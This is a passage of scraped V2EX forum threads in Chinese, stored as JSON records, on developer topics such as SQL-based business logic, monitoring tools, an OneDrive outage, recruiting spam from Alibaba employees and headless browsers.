"四楼是对的", "sql 中最好不要涉及业务逻辑，看场景，能拆就拆， join 、子查询的效率并不高，甚至有时候低的夸张", "业务负责人是从 Windows Client 年代传下的习惯。那年头的架构习惯是：展示及交互使用 VC/BCB/Delphi/VB 来编写；业务模型及逻辑使用 SQL 存储过程及函数来编写， Client 处理逻辑时直接调用 SQL 过程。\r", "\r", "之所以这样玩，第一是方便重用和调试，那时 Client 经常版本众多（特殊版，某地修改版，一个管理系统全国铺开，上百个个性化版本很觉见），但是后端逻辑相对稳定。第二是现场救火时处理，发现由于逻辑或者数据造成的问题，直接去 SQL 服务器上改脚本就可以了，否则重新编译打包分发个客户端出来就麻烦多了。第三是多客户端同时连上时，直接使用数据库来处理 transaction 和并发数据冲突。\r", "\r", "缺点是很多的， SQL 脚本写的逻辑，年数一多之后，简直让人发晕。相对于编程语言，很多逻辑处理，使用 SQL 来实现要麻烦，可难维护的多。如果用户量上来，想将计算可扩展， JAVA 只要部署一堆进程，使用 http 分发即可。分布式数据库可就折腾和花钱了。\r", "\r", "总而言之，这是门相对过时的架构设计方法。当年做 Delphi ， VC ， VB 是这么干，并不意味着几十年过去后还要这么干。", "SQL 和 Java 的市场需求不同。\r", "看市场，使用 SQL 会比 Java 多？\r", "在 SQL 里面写了一堆逻辑，这不明显增加维护成本？\r", "明明可以招个写 Java 的进来写业务代码就好了，现在偏偏要招 SQL 人员来写。\r", "后者需求少，价格明显也比 Java 高。", "sql 的维护成本 相比 代码来说应该会高", "这个看需求的，一般来说，互联网项目会依赖数据库比较少，很多业务逻辑都在应用层面做了。但是传统企业的项目，技术架构就没有那么先进，采用的多数是， Transaction Script\r", "\r", " ", "\r", "\r", "这种模式扩展性会比较差，但是有一个前提是你的业务量达到了需要扩展的那个点。", "这个问题可以简化为：《业务负责人是傻逼怎么办？》", "看你需求的类型， OLTP 的业务逻辑只要不涉及事务的，尽量在程序里维护； OLAP 的业务逻辑你不用 SQL ，数据正确性、一致性这些你自己程序维护，时间稍长都是坑。\r", "\r", "数据库性能这个，如果只用过 MySQL ，真的就不要提了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ul>\n<li>更加朴素</li>\n<li>PC 上使用 touchmove 来交换，移动端使用陀螺仪</li>\n<li>方便修改、整合到自己的网站上</li>\n<li>链接：<a href=\"http://tangzhixiong.com/panorama-viewer/\" rel=\"nofollow\">http://tangzhixiong.com/panorama-viewer/</a></li>\n<li>欢迎 star ;)</li>\n</ul>\n</div></div>", "<div class=\"topic_content\">说错了，是 mousemove</div>"], "reply": "32", "tittle": "写了一个全景图查看器，类似于 720 云", "comment": ["github 地址呢", " 页面上的二维码，点击一下就过去了。地址： ", "直接用的 threejs 的 demo 嘛。。。而且不支持碎片图", "持续朝一个方向滚动鼠标滚轮会有奇迹发生 （#滑稽）", " 整合了移动端。主要是自己用来校准两张全景图方向用的。", " 吃完饭我决定制止你……", "非常牛逼。。。", "Mark 下, 多年前用 Flash 做了个类似的东西.", "给你开了个 bug ，不谢，", " 现在不可以了哈哈哈。", "和 pannellum 比有什么优势吗？", " 才发现我以前 star 过那个……我得偷窥一下源码……", "无比流畅", "你这到底是个项目还是个 demo ？", "全景图用什么姿势拍的呢", " Demo 。", " 可以用专门的全景相机拍（十分广角的镜头，一般还有一个反光的锥面）。或者用多个普通相机放在同一位置（或者一个相机旋转），然后影像拼接（比如用 PTGui 之类软件）得到 360x180 的 equirectangular 投影的相片。", " 更新了两张我们组自己拍的全景图。", " 请问 iphone 全景拍照可以拍这种，然后在处理吗？", " iPhone 等智能手机那种意义的“全景”（全景拍摄模式）和投影中的“全景”（一种投影）不太一样。那种全景的渲染还需要指明水平和垂直方向的 fov 大小，然后渲染的时候图片会被投影到局部的球面而不是整个球面上。这里有个例子： ", " （图片是随便贴上去的，所以看起来不自然，但投影方式是这个意思）。", "写了一个不依赖 three.js 的 vue 组件版 ", " 但那种全景的竖直方向 fov 其实不大。所以那个“局部的球面”很像一个长方形，直接水平平移显示就很自然了。那种全景的拼接可以考虑用这个（话说不是自动生成好了么）： ", " 。", " Cool! 直接上 shader == 最近正被它折磨。", " \r", "可以用\r", "安卓：相机(google 出的)\r", "IOS/WP ： Photosynth （ MS 貌似下架了）", "翻到楼上的 @", " 的一篇博客：[使用 Microsoft ICE 制作全景照片]( ", ") 里面有哈哈。 Mark 。", "鱼眼图没有啥特别的。", " vue-pano 缺文档，还有各种 bug 所以并没有发出来", " @", " 三星比较旗舰的可以环绕拍摄，另外还有 Hugin 可以拼接图片， win/osx/linux/...都有", "vultr 那个机房比较好啊？", " \r", "擦，回错主题了，悲剧", " 试试微软的 Microsoft ICE ，只有 Windows 但比 hugin / ptgui 好用", " macbook 空间不够虚拟机都删了😅，以后有机会试试哈~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>实际应是西雅图时间 3 月 7 日上午 8 点~~~<br>\n<a href=\"http://www.zdnet.com/article/microsofts-visual-studio-2017-is-now-generally-available/\" rel=\"nofollow\">详情地址</a></p>\n</div></div>"], "reply": "3", "tittle": "Visual Studio 2017 正式版于北京时间 3 月 8 日 0 点正式发布了", "comment": ["官网没提供离线安装包，但可参考此教程制作：\r", "想起去年装 vs2015 花费了 2 个周末。一直搞不懂巨硬既然想在移动市场分一杯羹，为何不在大陆放一份安装源，光是装 vs 就把很多开发者拒之门外了。", "根据这几年的使用经验来看，新版本出 SP 1 之前，会有很多 BUG 。"]},
{"content": ["<div class=\"topic_content\">想把 20 余台跑控制软件的服务器（ x86 CPU ， ubuntu 、 CentOS 7 及 Windows7 系统）的资源（ cpu ，网络，内存，硬盘等）状态集中监控起来，想找一块开源或者免费的工具，而且我还希望监控数据能够提取并集成到我自己开发的一个健康管理系统中来，所以恐怕得开源的工具我才能获得这个数据\r<br>\r<br>请问有满足这个需求的一款工具推荐吗？</div>"], "reply": "10", "tittle": "想找一块简单高效非常轻量级的系统资源监控工具", "comment": ["zabbix", "prometheus", "dstat 逃 现在就在用这个", "看到 Nagios ，不知道哪个更适合，看来只得找时间试一试了", "zabbix", "zabbix 的 API 很简单的", "\r", "\r", "C 开发，对服务器影响小，吊炸天 web 界面\r", "\r", "吐血推荐", " 这个看起来还确实吊炸天", "netdata 好像不支持 windows ，但是依赖少，而且据说资源消耗少", " 这界面好好看， 有空我要来玩下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 vscode 中写 go 代码，对于导出的变量或函数不写注释总是提示一个警告，有没想 idea 那样可以自动生成一个注释格式的插件？</p>\n</div></div>"], "reply": "2", "tittle": "vscode 下有什么好的注释插件吗？", "comment": ["GhostDoc", "可以改 golint 的参数吧"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://dev.qq.com/\" rel=\"nofollow\">http://dev.qq.com/</a></div>", "<div class=\"topic_content\">&gt; 快来支持 @<a target=\"_blank\" href=\"/member/livid\">livid</a>\r<br>\r<br>你们不爱 V2EX 了吗？\r<br><a target=\"_blank\" href=\"http://dev.qq.com/topic/58be4afaca45215a20789207\" rel=\"nofollow\">http://dev.qq.com/topic/58be4afaca45215a20789207</a>\r<br>\r<br>---\r<br>\r<br>&gt; 感觉腾讯即将关闭注册功能，被玩坏了\r<br>\r<br>有人来注册好点的用户名？\r<br><a target=\"_blank\" href=\"http://dev.qq.com/topic/58be299f966191a46d7d469f\" rel=\"nofollow\">http://dev.qq.com/topic/58be299f966191a46d7d469f</a></div>"], "reply": "65", "tittle": " 是腾讯的一个新站点吗？", "comment": ["感觉跟这个网站一样啊。。。", "好没有人气", "点击登录 、、、进入的是 bugly 的登录...", "做得好粗糙", "全是转载..", "赶紧上去抢个用户名 ", " ", "中文版的 hackernews?", "Welcome to Bugly 2.0 community. The lazy author hasn ’ t left anything here. But the surprise is on the road.", "赶紧上去抢个用户名", "看到有人在发无意义内容刷屏。。", "还不能举报。。", "做得这是什么鬼", "抢了个用户名", "抢了个用户名", "抢了个用户名 ryzen", "有什么好抢的？", "Tencent 已经被注册了，就试了个 alibaba 居然成功了。我保证不说话不传谣不给大厂造成名誉损失。。。", "他们的删除图标叼炸天。。。\r", "<i class=\"fa fa-lg fa-wechat\" title=\"删除\"></i>", "主域名都是他的，子域名不是他在用也是授权的", " 你首字母没大写", "抢注了一个 Github", "全在秀用户名哈哈哈哈哈", " #23 老哥好久没看到你博客更新了 ", " ", "alphabet 已注册 23333", " 哥最近快忙死了 T_T", " 没事，我们开着订阅等更新", " 😂老哥有时间更新一下哈，等着学习呢", "bugly 的 dev club 啊", "这就是 ", " 的源码改了改界面。", "没啥好玩的。", "注了个 dropbox", "为啥我点注册跳到了 qq 注册？？？", "注了个 python", "连 https 都不支持", " UI 做的还可以啊。", "  我注册的的 Python....", "  可以重名的吗？", "注册了个 devqq", " ", "\r", "大小写不同，还在开发中吧，未登录查看别人主页竟然显示 ［设置 /退出］", "我为什么找不到注册？", " 找到了。。。", " 然后就可以注册 ID 了，先登录 qq", "有人来注册好点的用户名？ \r", "\r", "\r", "这个帖子被删了，玩坏了", " 好的，就去弄个霸气的 id", "挂了 2333", "心塞，已经注册不了了？？？？？", "  好把", "没人吐槽 ", " 里面 item 的 link 属性都多了个 ‘/’，结果访问出错吗？如：\r", "\r", "注册了一个腾讯 CEO", " #25 Alphabet_Inc ", " ", "注册了 Nokia...", "  Microsoft_Inc  Apple_Inc", "说不定明天就删档了", "因为域名注册了，感觉除了域名没啥比 v 站优秀的", "MySQL", " 忙是好事情", "底部还是 2016 …", "注册到了 Bugly....", "发什么内容都提示被和谐。。。", "qq 二级域名真多", "Dev Club 是什么？\r", "\r", " Dev Club 是一个交流移动开发技术，结交朋友，扩展人脉的社群，成员都是经过审核的移动开发工程师。每周都会举行嘉宾分享，话题讨论等活动。\r", "\r", "\r", "散了吧", "My ID is 'hacker' \r", "好吧，说人话。敌方的小头像很耐看，能二次编辑，编辑器和点赞功能也很好，不足之处是楼层数在左边，显得有点拥挤，而且楼层数和发表时间共用一个 URL ，不美丽！\r", "整体美观度不如 V2 ，,没有右侧栏，太单调\r", "爱 V2 ，得永生！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>zabbix 自带地 web 缺少灵活性不考虑\n打算用脚本直接调，然后通过 agent 上报\n现在问题是 一个报文返回多个结果，需要单独设置。如果站点多的话设置起来就很麻烦。\n大家有更好的方案吗？</p>\n</div></div>"], "reply": "3", "tittle": "请问用 Zabbix 同时监控多个 url，用脚本如何实现？", "comment": ["zabbix_sender", "zabbix 需要 设置 crontab 来执行。但是我们调用的第三方接口 有并发限制。", " zabbix 需要 设置 crontab 来执行。但是我们调用的第三方接口 有并发限制。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://hacks.mozilla.org/2017/02/a-cartoon-intro-to-webassembly/\" rel=\"nofollow\">https://hacks.mozilla.org/2017/02/a-cartoon-intro-to-webassembly/</a>\r<br>\r<br>文章写得面向初级开发者, 进阶开发者请直接移步 <a target=\"_blank\" href=\"http://webassembly.org\" rel=\"nofollow\">webassembly.org</a></div>"], "reply": "1", "tittle": "分享 Lin Clark 浅显易懂的 WebAssembly 普及文", "comment": ["魔性配图…"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有用 QQ 输入法的吗，刚更新了下，就他妈的没法愉快的写代码了，我用 vim 从正常模式进入插入模式自动变成中文输入法，写个代码还得用易语言不成，感觉 QQ 输入法越更新越难用了</p>\n</div></div>"], "reply": "3", "tittle": "新版 QQ 输入法在 vim 下的问题", "comment": ["用清歌输入法吧。", "我一直用手心输入法...", "竟然还在更新？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Flickr 不论搜索什么，每次都最多只能返回 4000 个结果，这对于亿级图片为单位的 Flickr 是不是太抠了点，我想尽可能的挖掘更多的 Flickr 图片，除了增加更多的关键词来搜，还有没有更好的办法？？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Flickr API 每次最多只能返回 4000 个结果，怎样挖掘更多的图片？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>突然就连不上了， <a href=\"http://live.com\" rel=\"nofollow\">live.com</a> 要用特殊的姿势才能打开了</p>\n</div></div>"], "reply": "42", "tittle": "onedrive 挂了？", "comment": ["好像帐号也没了= =\r", "live 上了也登录不了", "你是不是网上买的教育版 onedrive 被删号了", "onedrive 被墙了好几年了，用客户端可以", "Skype 好像也登不上去。", "我收回刚刚说的话。。。。确实打不开。挂代理也不行", "我也是 邮箱全部登不上了", "……嗯， bing 输入法也登陆不了了，居然说我的账号不存在", "用手机登 Skype 也不行，输完密码登录之后是空白。", "ios 一直在提醒我重新登录..输密码的时候网页就不正常，登陆了还是要我重登", "我的邮箱也上不去了", "手机打开没问题。", "shabby 微软，烂泥扶不上墙的狗东西！。", "我的也是， onedrive 提示登陆失败。 MSSPError=-805308370", " 真的挂了", "的确挂了...登录没问题，登录完就进不去 ", " 了", "额，我说怎么回事呢，原来大家都上不去啊", "怪不得今晚总是弹出身份验证框。", "刚试了下可以了，挂代理", " #18 哪一个区域的代理？", "手机没问题， ipad 登不上，但是特么在同一个 wifi 下啊", " us 和 hk 都可以", "搞事件啊， s3 刚走，巨硬也想带波节奏", "深圳电信没问题", "收回刚才的话，登录了下，没问题啊。", "这会儿恢复了", "恢复了一阵，又跪了", "怪不得 Windows 的 OneDrive 客戶端一直沒有自動登錄，還以為 Bug 10 立功了", "移动联通网络无问题", "电脑可以登录，但手机不行，很奇怪", "挂不得今晚手机不停提醒我验证 mail\r", "才开始验证不成功。\r", "刚才又试了下，可以了。 @", " 2017 年 3 月 7 日 23:53:17", "这都是日常了。", "服务器瘫了", "海外 ios 的 outlook 邮箱也不行了，总提示重新 OAuth 输入密码。。。网页可以上。。。", "VS2017 发布，然后出问题了？", "估计是 MSA 的问题。。。", "我说为啥昨晚 Spark 提示重新登陆，过了两步验证又跳回登陆页面。。。\r", "原来微软也搞事情", "昨晚挂了一会。。", "发消息了， outlook 大面积宕机，英、美、欧大约数千名用户无法登录", "国内挂香港节点稳定同步文件 ing...", "确实挂了，现在恢复了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如果你是：</p>\n<p>UI 设计师\n产品经理\niOS 开发工程师\nAndroid 开发工程师\nPHP 开发工程师\nJava 开发工程师\n前端开发工程师\n接口开发工程师\n手游开发工程师\n这其中有一项技能你可以熟练掌握，请过来报个名吧，我们的目的是希望你可以加入我们有一份不错的收入，我们这里可以长期的提供各种项目。</p>\n<p>大家提交的每份信息我们都会马上记录下来，会尽快答复,期待你的加入。</p>\n<p>提交地址:\n<a href=\"http://cn.mikecrm.com/5uIahMe\" rel=\"nofollow\">http://cn.mikecrm.com/5uIahMe</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "招聘远程小伙伴", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我已经不记得收到过几次来自于 #@alibaba<a href=\"http://-inc.com\" rel=\"nofollow\">-inc.com</a> 的邮件了。</p>\n<p>明明是群发骚扰邮件，却喜欢写着“我们怀着对人才的敬畏态度诚心邀请各路技术精英加盟”。</p>\n<p>明明是写 JavaScript ，邮件却都是招 JAVA 。</p>\n<p>近期收到的：\nyangbo.xuyb@alibaba<a href=\"http://-inc.com\" rel=\"nofollow\">-inc.com</a>\ndaren@alibaba<a href=\"http://-inc.com\" rel=\"nofollow\">-inc.com</a></p>\n<p>远离垃圾邮箱，从拉黑这些邮箱开始。这种邮件应该只会越来越多。</p>\n<p>如果没有到阿里工作的意向我觉得可以全域屏蔽了。。</p>\n</div></div>", "<div class=\"topic_content\">现在 google 搜这两个邮箱已经是第一条结果了。</div>"], "reply": "57", "tittle": "批量给 Github 用户发招聘邮件的 ", "comment": ["我也收到过，看了下，邮件有 DKIM 签名而且通过了校验，因此可排除冒充的可能，这个后缀应该也是他们员工才能用的邮箱。", "不是好多会爬 github 的 HR 么…", "\"吕胜(儒尊)\" <", ";", "\"许洋波(伏魔)\" <", ";", "收到两个", " 我也是", "我做终端的, 却给我发了个 j2ee 的", "程序员 Q1 招聘指标", "真羡慕你们能被骚扰 ", " ", "真羡慕你们能被骚扰", "员工，后缀是阿里内部邮箱", "楼主是 vux 作者吧，虽然我也收到的是 java=_=", "没有收到，不开心", "真羡慕你们能被骚扰", "我就没有一个 Java 的 Repo ，招聘的人不上心啊", "难怪会发到我公司邮箱里。恶心透了", "在 Gmail 的 spam 里看到 儒尊 伏魔 我以为是中二少年修真看多了来钓个人信息的……\r", "后来看很多人说才发觉是真的啊……", "表示可以截图拿去装逼", "所以 Javascript 方向的你要来么：）", "真羡慕你们能被骚扰", "真羡慕你们能被骚扰", "看邮箱是员工个人邮箱，可能跟 hr 并没有关系，如果你通过给你发邮件的人进入了阿里，那么他们是有奖励的。估计是某些技术员自己做的爬虫，内推为自己收福利，价值观满满的。", "之前收到过丁香园的招聘邮件， noreplay 开头的，最后留的联系邮箱是 robbin 的 gmail ，这才感觉比较像公司行为。", "查了下  不是 HR   确实是业务", " 通过 dkim 并不代表不是垃圾邮件。这个很好做的", "建议这些 hr 先把 JavaScript 过滤之后在匹配 Java ，要不这样误伤好大", "真羡慕你们能被骚扰", " \r", "跟你的猜测一样，不知道这符合价值观不？", "没有收到，不开心", "收到过一个阿里 HR 的大片黄色的邮件，格式文字内容无一不漏，英文大概有 1/4 是大小写正确的。", " 我的意思是这封邮件确实是从 ", " 发出来的，而不是别人冒充了这个邮件地址。", "我也收到了", "真羡慕你们能被骚扰 +1", "表示我也收到，《吕胜(儒尊)》", "同样啊，我还纳闷，别人怎么会知道我的这个邮箱，你一说 github 我才明白，我 github 用的就是这个邮箱。\r", "也是 \r", "吕胜(儒尊)发的。\r", "亲 您好，\r", "      如果这份招聘邮件打扰了您我们感到万分抱歉。 PS ，阿里的同学请忽略这封邮件。 \r", "      我们怀着对人才的敬畏态度诚心邀请各路技术精英加盟，如果您近期有换工作的意向、如果您希望有全球技术极限挑的战招场景、如果您需要业界第一流的薪水和奖金，并且对阿里巴巴感兴趣，那么有劳亲将简历以 word 或者 pdf 附件形式回复到本邮箱，回复时文档命名如：“张三-3 年 java-清华大学-杭州”，我们将为您电话互动沟通后推荐到最合适的匹配职位。 \r", "本次人才招聘仅限于杭州阿里巴巴、 java 技术，薪水业界一流、人数不限。有劳各位、欢迎推荐身边的朋友和同事，谢谢支持。", "郑游洋(大仁) <", ";\r", "许洋波(伏魔)\" <", ">;", " 这个家伙发了多少", "我居然都会受到，可是我是辣鸡", "要么这几个人是业务负责人在给自己招聘人手，要么他们是为了推荐的奖金，如果是后者，按照月饼厂的价值观，怕是要 GG 的吧。", "拖入垃圾邮件箱，过段时间 GMail 会帮我们屏蔽阿里的", "不是 HR ，是普通员工。已在内网反馈。", " #24 我一个写 python 的也收到过两封 java.....", "我也收到了， gmail 自动归类到垃圾桶，不查看真没有发现。吕胜(儒尊)发出的", "我也收到了，妈蛋", "看了你的帖子，特意去 gmail 的垃圾邮箱里找了找，还真有给我发的邮件，是招聘 java 的。 吕胜(儒尊) <", ";", "想多了。。他们的内推只是为了完成 kpi.", "真羡慕你们能被骚扰", "为什么我没收到 _(:3 」∠)_", "咦原来收到了真的在垃圾箱。。", "我的 github 一行 java 或 js 都没有，为什么仍然收到了 java 职位的？", "真羡慕你们能被骚扰", "收到 Java ，问题是 github 上貌似没有和 java 太多的活动啊", "哎，一个写 PHP 的都给我发招 Java ；这不是找我去干架么？", "同一份邮件... 直接删掉了", "真羡慕你们能被骚扰", "作为一个 V2EXer 同样非常反感这件事，也受过电子邮件招聘的骚扰。我厂内部已经有帖子对这次的不当行为进行讨论了，只能说真给我厂丢人。", "真羡慕你们能被骚扰 +38", "我也没少收到，每次收到都是一脸懵逼", " \r", " \r", "\r", "话说内网有讨论结果吗？如果是我发的，这会我至少得公开出来 say sorry 一下了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>没毕业还在校，学了大数据库框架感觉没有什么大规模的数据可以让我尝试说做做项目，是不是只能自己去各大网站爬一些有意思的数据下来？</p>\n</div></div>"], "reply": "2", "tittle": "自学 hadoop,spark 可以拿什么练手啊", "comment": ["爬什么啊 这门多 opendata 给你用 维基百科 推特神马的 这么多 够你玩的 而且每天都有新数据", "公司里没项目，学校里没有足够的服务器玩个蛋。。看看原理就行了。。。。"]},
{"content": ["<div class=\"topic_content\">想部署一个自己的工具，留个 HTTP 接口， Web 根目录设为这个工具的日志输出路径，可以随时打开进去看它的日志。</div>"], "reply": "9", "tittle": "在云主机的非 80/443 端口开 HTTP 需要备案吗", "comment": ["非标准端口的 http 用域名访问不备案也不行 ", " ", "不用，你开下不就知道了，如果需要备案会有提示的", " 云主机还没买，怕买了还要备案就麻烦死了。", "80, 8000, 8008, 8080\r", "这些端口一般都有审计。", "为了方便自己及身边几个人用，还是准备做成工具网站推广。\r", "前一种不行搞个国外的 vps 就行，后一种的话还是备案吧...", "既然是自己用，直接用 ip 得了", "我记得之前腾讯云 https 是可以不用备案的，不知道现在还是不是", "webdav 协议需要备案吗？", " 仍然是"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前由于服务器硬盘是 HDD ，比较渣，所以常规的 limit 查询分页的方式在百万级的数据下有点吃力，所以目前想采用游标式的分页方式，即 WHERE id&gt;1234 的方式分页，但是这样的分页 url 对 SEO 是否友好，比如 www 。 abc 。 com/startId=1234</p>\n</div></div>"], "reply": "4", "tittle": "MySQL 查询采用游标分页的方式，对 SEO 有没有影响？", "comment": ["这和 seo 的关系是? 不就 url 加个参数嘛，网页打开速度快， spider 爬的也快，好收录，至于这个 url 没什么影响吧", "我以为你讲的是数据库的 cursor 。别乱用术语啊！", "你的 url 生成跟数据库木有半分钱关系。", "现代搜索引擎连动态内容都能抓，你这个影响不大\r", "其次，数据库游标和你页面的 url 有个毛关系，你不过是要传后台一个参数而已，是你们自己的技术限制了非要写成\r", "startId=1234 这种形式吗？难道就不能是 ", " 这种形式的 url 不就没影响了，很多框架的现代路由技术都支持以路径方式取代 querystring 方式传参的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>RT, 求推荐无头浏览器， PhantomJS 因为怪异的问题比较多，所以不太想用。</p>\n<p>说说需求吧</p>\n<ul>\n<li>支持 node.js 调用；</li>\n<li>webkit 内核的，内核版本最好比较新一些（相对来说， webkit 更熟悉些）；</li>\n<li>支持请求，返回的 hook ，修改；</li>\n<li>当然基本的注入脚本，样式，获取状态等基础功能都支持；</li>\n<li>截图功能支持比较完善，支持窗口截图和页面截图；</li>\n<li>flash 支持不支持都行；</li>\n<li>其他的字体 fallback ，缩放， retina 屏幕支持（自定义设备像素比）；</li>\n</ul>\n</div></div>"], "reply": "7", "tittle": "求推荐无头 (headless) 浏览器", "comment": ["同求，正在看 Splash", " 谢谢，看 API 还不错", " Splash 怎么样，主要是 py 的，哈哈", " 这两天在忙别的，还没测试呢", "PhantomJS 因为怪异的问题比较多\r", "讲讲你的故事\r", "除了内存泄露不用说\r", "那么多人都在用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前一直没管手机认证的事，结果最近突然发现没有办法登陆了，之前绑定的手机号不知道扔到哪里去了</p>\n<p>申诉了 4 次一直没有成功。</p>\n<p>打客服告诉我信息错误，关键是根本记不住几年前各种乱七八糟的信息</p>\n<p>各位有木有什么好办法找回百度账户啊...</p>\n</div></div>"], "reply": "10", "tittle": "百度辣鸡强制手机认证申诉不通过", "comment": ["我也是。。。", "我也是+1 ，手机号还没有还过来呢", "我也是，申诉了好几次都通不过。", "我七八年前注册的 ID 好多黑历史 什么都没绑定 现在也找不回来 只希望它能在历史的长河中永远沉睡", "我之前也是这样。\r", "后来找回的诀窍是，不必要填的信息宁可留空，也不要填错。\r", "竟然终于有一次申诉成功回来了。\r", "\r", "但还是没有阻止我停止使用百度网盘 SVIP ……", "我也是！\r", "我申诉了 8 次！\r", "苍天啊！", "第一件事就是要我手机扫码，就没有申诉的欲望了", " \r", "二维码解析  -->  复制网址  -->  浏览器打开\r", "电脑上就行了", " 下一步填身份证，立即关闭页面呢", " 试试 F12 跳过\r", "几个月前没有这步的"]},
{"content": ["<div class=\"topic_content\">如题，想把手机拍的图上传，可是没有选项</div>"], "reply": "目前尚无回", "tittle": "怎么在 iPhone 上帖子编辑器里添加图片？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>露珠之前是用后台 admin 来写博客的， Markdown 编辑器也用的是 <a href=\"http://editor.md\" rel=\"nofollow\">editor.md</a> 编辑器，虽然感觉用着还行，但是有个弊端就是渲染出来的 markdown 样式感觉太丑了，所以想换一个 markdown 编辑器，然后重写后端的页面，添加一些其他功能，现在继续一款美观，且渲染的 markdown 也好看的编辑器。</p>\n</div></div>"], "reply": "1", "tittle": "说说你在开发网站过程中所用到的 markdown 编辑器把", "comment": ["simple mde"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>aur 包地址：<a href=\"https://aur.archlinux.org/packages/xmake/\" rel=\"nofollow\">https://aur.archlinux.org/packages/xmake/</a></p>\n<p>这个主要是基于 lua 做跨平台自动构建的工具，最近刚做好 aur 包，提交到了 archlinux 上去</p>\n<p>如果觉得这个工具还不错，就帮忙投下 votes 哈，谢谢。：）</p>\n</div></div>"], "reply": "3", "tittle": "新提交了个 aur 包到 archlinux 上，来拉点投票哈。。", "comment": ["赞一个  我也有在用\r", "然而尴尬的是我的密码忘记了  明天去看看 😁", "为什么 url 指向 github 但 source 放的 coding....\r", "gcc 在 base-devel 里面不用写 depends\r", "自己 provide 自己是什么思路...\r", "prepare() 里面 ls 一下也很神奇\r", "package() 里面 cd find 一下应该是没必要的\r", "最后那几个 install / cp 混着来也感觉有点怪怪的\r", "\r", "综上，打包质量不足以让我 vote, 不过楼主自己开发的工具往 aur 提供软件包是很赞的～～", " 哦哦 刚做的 aur 做的还比较粗糙 我再改进下 我本来想放置放置两个源的 一个 github 一个 coding 这样国内下载快些 用 coding 但是不知道怎么同时加两个源 所以暂时放了 coding 的上去     谢谢你的建议"]},
{"content": ["<div class=\"topic_content\">1  [团队介绍] ： 3000 人+， 60%以上工程师。\r<br>2  [产品&amp;业务介绍] ：多条产品线同时推进，产品多多，可以选择自己喜欢的。\r<br>3  [用户量&amp;市场介绍] ：公司去年营收 80 个亿，利润 16 个亿。\r<br>4  [融资情况] ： 已上市。\r<br>5  [公司文化&amp;福利] ：优质办公环境，基本不加班，双休。\r<br>\r<br>\r<br>有兴趣的亲，请联系 QQ ： 1499178377 或微信： 18621347513\r<br>\r<br>计算机图形算法工程师：\r<br>岗位职责：\r<br>研发 3D 动画，虚拟人物和道具等 AR 相关技术研发和产品应用。\r<br>任职资格：\r<br>1 、有扎实的计算机图形学和数学基础，对 3D 图形学技术有深入了解和浓厚兴趣；\r<br>2 、熟练掌握 3D 渲染相关算法，熟练掌握主流图形 API （ Opengl/Opengl ES/D3D)及 Shader(GLSL/HLSL)语言，并有相关项目经验和作品；\r<br>3 、熟练掌握 Unity 3D 等至少一款主流 3D 引擎架构，有 3D 引擎研发经验者优先；\r<br>4 、熟悉 3ds Max/Maya/C4D 等建模工具的使用者优先；\r<br>5 、有人体人脸动作捕捉， 3D Avatar 渲染， AR 等项目经验者优先；\r<br>6 、有计算机视觉，机器学习基础或手机端研发经验者优先</div>"], "reply": "18", "tittle": "广州算法招聘", "comment": ["求引擎大牛们关注哈。。", "有什么问题，还请留言。", "YY?", "不说公司名像传销啊", "既然都上市了，就公布下证券代码吧，让我等调研下", "卖家具的？", "为啥不把公司名挂出来呢", "菲律宾菠菜吗？", "是猎头，说出来丢自己的饭碗。", "看着就像猎头发的，是 hr 或内推早把番号挂出来了", " 恩，一看就是资深人士。我们这些顾虑一清二楚。", " 传销什么时候需要技术了，演讲就够了吧。", " 不是，只做互联网的。", " 猎头不能挂公司名字，要保密招聘，当然电话、邮件等针对个人的就没问题了。。论坛什么的，就不可以。。", " 私信我，我给你证券代码。", " 太高大上了，做不了。", " 在主页没找到私信入口。。。", " 上面不是有电话号嘛，发短信，打电话呀。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在有一个视频的 m3u8 文件、 ts 文件、 hxk 文件， ts 文件太多，不知道如何合并、播放，求教</p>\n</div></div>", "<div class=\"topic_content\">需要合并的视频： <a target=\"_blank\" href=\"https://pan.baidu.com/s/1dFFSzwH\" rel=\"nofollow\">https://pan.baidu.com/s/1dFFSzwH</a></div>"], "reply": "102", "tittle": "AES-128 加密的 ts 视频文件如何合并", "comment": [" 发文件我研究一下", " 知不知道 mpd 格式的视频流怎么下载啊？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>微服务在业界正获得越来越多的关注，理解微服务架构模式，对现有企业应用转型升级大有帮助。如何快速学习微服务中复杂的概念，掌握其实践，成为众多学习者关注的问题。<strong>DaoCloud 首席架构师王天青</strong>为大家带来「 3 分钟学习微服务」系列，为微服务学习 <strong>划 重 点</strong> ！本期重点：「事务」及「分布式事务」。</p>\n<h1>事务</h1>\n<p>事务是现代数据库理论中的核心概念之一。如果一组处理步骤或者全部发生或者一步也不执行，我们称该组处理步骤为一个事务。当所有的步骤像一个操作一样被完整地执行，我们称该事务被<strong>提交（ Commit ）</strong>。由于其中的一部分或多步执行失败，导致没有步骤被提交，则事务必须<strong>回滚（ Rollback ）</strong>到最初的系统状态。</p>\n<h1>事务的特征</h1>\n<p>事务是并发控制的单位，是用户定义的一个操作序列。这些操作要么都做，要么都不做，是一个不可分割的工作单位。</p>\n<h2>ACID</h2>\n<ul>\n<li>\n<p><strong>原子性 (Atomicity)</strong> 